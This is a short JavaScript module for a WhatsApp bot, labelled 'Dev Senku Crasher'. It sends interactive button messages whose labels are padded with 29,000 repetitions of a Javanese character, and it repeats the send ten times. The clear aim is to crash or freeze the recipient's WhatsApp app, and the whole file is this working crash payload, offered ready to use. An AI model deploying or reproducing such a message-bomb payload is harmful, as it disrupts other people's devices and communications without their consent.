async function bug(message, client) {

  const remoteJid = message.key.remoteJid;

  await client.sendMessage(

    remoteJid,
    {
      image: { url: "4.png" }, // Replace with local or hosted image

      caption: "🌟 Dev Senku Crasher",

      footer: "My Awesome Bot 🔥",

      media: true,

      interactiveButtons: [

        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `Senku crash 1${"ꦾ".repeat(29000)}\n\n`,
            id: "refresh"
          })
        },
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: `Senku crash 2${"ꦾ".repeat(29000)}\n\n`,
            id: "info"
          })
        },
        {
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: `Senku crash 3${"ꦾ".repeat(29000)}\n\n`,
            url: "https://example.com"
          })
        },

      ]
    },
    {
      quoted: message
    }
  );
}
async function test(message, client) {
    for (let i = 0; i < 10; i++) {
        await bug(message, client);
    }
}

export default test;
